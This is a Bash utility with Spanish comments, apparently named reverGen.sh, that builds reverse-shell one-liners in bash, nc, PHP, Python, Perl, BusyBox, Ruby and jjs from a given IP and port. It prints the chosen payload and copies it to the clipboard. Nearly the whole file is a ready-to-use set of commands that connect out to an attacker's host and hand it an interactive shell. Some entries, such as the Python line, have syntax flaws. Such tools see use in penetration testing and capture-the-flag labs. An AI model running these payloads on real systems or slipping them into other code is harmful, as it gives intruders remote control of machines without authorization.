#!/bin/bash

#reverse shell para to' los gustos

# ./reverGen.sh -l bash -i 10.10.1.1 -p 1212

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
orangeColour="\e[38;5;208m\033[1m"
whiteColour="\e[0;97m\033[1m"
whiteUltra="\e[38;5;231m"
blod="\e[1m"

trap ctrl_c INT

function ctrl_c(){

	echo -e "\n${redColour}[!]${endColour}${blueColour} Saliendo...${endColour}\n"
	tput cnorm;exit 1
}


function helpPanel(){

	echo -e "\n${yellowColour}[+]${endColour}${grayColour} Uso: ./reverGen.sh -l lenguaje -i ip -p port${endColour}\n"
	echo -e "\t${purpleColour}l)${endColour}${blueColour} Especifica el lenguaje${endColour}\n"
	echo -e "\t${purpleColour}i)${endColour}${blueColour} Especifica la ip\n"
	echo -e "\t${purpleColour}p)${endColour}${blueColour} Especifica el puerto\n"
	echo -e "\t${grayColour} Ejemplo: ./reverGen.sh -l bash -i 10.10.1.1 -p 1212${endColour}"
	tput cnorm;exit 0
}

function main(){

	declare -A reverse

	reverse[bash]="bash -i >& /dev/tcp/$ip/$port 0>&1"
	reverse[nc]="nc -e /bin/sh $ip $port"
	reverse[php]="php -r '\$sock=fsockopen("$ip", $port);exec(\"/bin/sh -i <&3 2>&3\");'"
	reverse[python]="python3 -c 'import sys,socket,os,pty;s=socket.socket() s.connect((\"$ip\",$port)) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(\"/bin/sh\")'"
	reverse[perl]="perl -e \'use Socket;$i=\"$ip\";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
	reverse[busybox]="busybox nc -e /bin/sh $ip $port"
	reverse[ruby]="ruby -rsocket -e \'exit if fork;c=TCPSocket.new("$ip",$port);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
	reverse[jjs]="jjs\nvar host=\'$ip\';\nvar port=$port;\nvar ProcessBuilder = Java.type('java.lang.ProcessBuilder');\nvar p=new ProcessBuilder('/bin/sh', '-i').redirectErrorStream(true).start();\nvar Socket = Java.type('java.net.Socket');\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type('java.lang.Thread').sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();"


	if [[ -v reverse[$lenguaje] ]];then

		echo -e "\n${purpleColour}[+]${endColour}${blueColour} Reverse shell (${endColour}${orangeColour}$lenguaje${endColour}${blueColour})${endColour}\n";sleep 1
		payload="${reverse[$lenguaje]}"


		#caja

		line="+-----------------------------------------------------------------------------------------------------------------------------------------+"
		echo -e "$line"
		echo -e "$payload"
		echo -e "$line"



		if [ -f /usr/bin/xclip ];then #xclip

			echo "${reverse[$lenguaje]}" | xargs | xclip -selection clipboard
			echo -e "\n${purpleColour}[+]${endColour}${blueColour} Se ha copiado la reverse shell en la clipboard${endColour}\n"

		else
			echo -e "\n${purpleColour}[!]${endColour}${blueColour} No tienes xclip por lo que no se ha podido copiar en la clipboard${endColour}\n"
		fi

		tput cnorm;exit 0
	else
		echo -e "\n${purpleColour}[!]${endColour}${blueColour} El lenguaje indicado no esta contemplado en el diccionario${endColour}\n"
		tput cnorm;exit 0
	fi
}


tput civis
declare -i parametro=0;while getopts ":l:i:p:" arg;do
	case $arg in
		l) lenguaje=$OPTARG; let parametro+=1;;
		i) ip=$OPTARG; let parametro+=1;;
		p) port=$OPTARG; let parametro+=1;;
	esac
done

if [ $parametro -ne "3" ];then

	helpPanel
else
	main
fi
